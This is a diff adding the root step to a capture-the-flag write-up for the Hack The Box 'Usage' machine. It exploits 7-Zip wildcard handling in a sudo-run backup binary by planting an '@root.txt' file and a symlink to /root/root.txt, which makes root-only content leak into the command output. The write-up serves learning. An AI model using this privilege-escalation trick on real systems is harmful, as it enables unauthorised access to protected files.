@@ -197,7 +197,7 @@ cd dash
 dash@usage:~$ ls 
 user.txt
 dash@usage:~$ cat user.txt
-REDACTED
+...REDACTED...
 dash@usage:~$
 
 Now that we are logged as 'dash', we can see that he has a .ssh folder which contain an id_rsa private key. I downloaded this private key to use a more reliable way to log onto the machine.
@@ -310,3 +310,112 @@ User xander may run the following commands on usage:
     (ALL : ALL) NOPASSWD: /usr/bin/usage_management
 xander@usage:~$ 
 
+Interesting. I started a python http server on the remote machine to download the binary.
+
+xander@usage:~$ cd /usr/bin
+xander@usage:/usr/bin$ python3 -m http.server 1337
+Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
+
+Then on my own machine I requested the file :
+
+┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/Usage]
+└──╼ [★]$ wget http://usage.htb:1337/usage_management
+--2024-05-13 18:59:11--  http://usage.htb:1337/usage_management
+Resolving usage.htb (usage.htb)... 10.10.11.18
+Connecting to usage.htb (usage.htb)|10.10.11.18|:1337... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 16312 (16K) [application/octet-stream]
+Saving to: ‘usage_management’
+
+usage_management    %[=============================================================================>]  15,93K  --.-KB/s    in 0,02s   
+
+2024-05-13 18:59:11 (940 KB/s) - ‘usage_management’ saved [16312/16312]
+
+┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/Usage]
+└──╼ [★]$ 
+
+Once the file downloaded, I opened a Ghidra session and I started to do some reverse engineering on it.
+
+<insert Ghidra6 image>
+
+We can see here that the function backupWebContent() uses /usr/bin/7za to zip the folder.
+Let's see if we can find an interesting vulnerability about 7za on the internet.
+
+After some research, I found something on hacktrickz about wildcards on 7z :
+
+https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks
+
+Let's try this !
+
+<insert hacktricks7 image>
+
+To achieve this, we need to find the path used by 7za. As we saw earlier, the binary zip the /var/www/html folder.
+
+xander@usage:/home/dash$ cd /var/www
+xander@usage:/var/www$ ls -la
+total 12
+drwxr-xr-x  3 root root   4096 Apr  2 21:15 .
+drwxr-xr-x 14 root root   4096 Apr  2 21:15 ..
+drwxrwxrwx  2 root xander 4096 May 13 16:54 html
+xander@usage:/var/www$ 
+
+And as we can see here, we have all permissions in the html folder. It means that we can create files inside. Alright !
+
+xander@usage:/var/www$ cd html
+xander@usage:/var/www/html$
+
+Then what's next ? Now, we need to create our malicious files :
+
+xander@usage:/var/www/html$ touch @root.txt
+xander@usage:/var/www/html$ ln -s /root/root.txt root.txt
+xander@usage:/var/www/html$ ls -la
+total 8
+drwxrwxrwx 2 root   xander 4096 May 13 17:18 .
+drwxr-xr-x 3 root   root   4096 Apr  2 21:15 ..
+-rw-rw-r-- 1 xander xander    0 May 13 17:18 @root.txt
+lrwxrwxrwx 1 xander xander   14 May 13 17:18 root.txt -> /root/root.txt
+xander@usage:/var/www/html$ 
+
+Okay now we need to execute the binary as root :
+
+xander@usage:/var/www/html$ sudo /usr/bin/usage_management
+Choose an option:
+1. Project Backup
+2. Backup MySQL data
+3. Reset admin password
+Enter your choice (1/2/3): 1
+
+7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7302P 16-Core Processor                (830F10),ASM,AES-NI)
+
+Open archive: /var/backups/project.zip
+--       
+Path = /var/backups/project.zip
+Type = zip
+Physical Size = 54862048
+
+Scanning the drive:
+          
+WARNING: No more files
+...REDACTED...
+
+1 file, 33 bytes (1 KiB)
+
+Updating archive: /var/backups/project.zip
+
+Items to compress: 1
+
+                                                                  
+Files read from disk: 1
+Archive size: 54862048 bytes (53 MiB)
+
+Scan WARNINGS for files and folders:
+
+...REDACTED... : No more files
+----------------
+Scan WARNINGS: 1
+xander@usage:/var/www/html$ 
+
+Wow ! Perfect ! It worked perfectly. The root flag is now display instead of the ...REDACTED... .
+
+Box pwn !
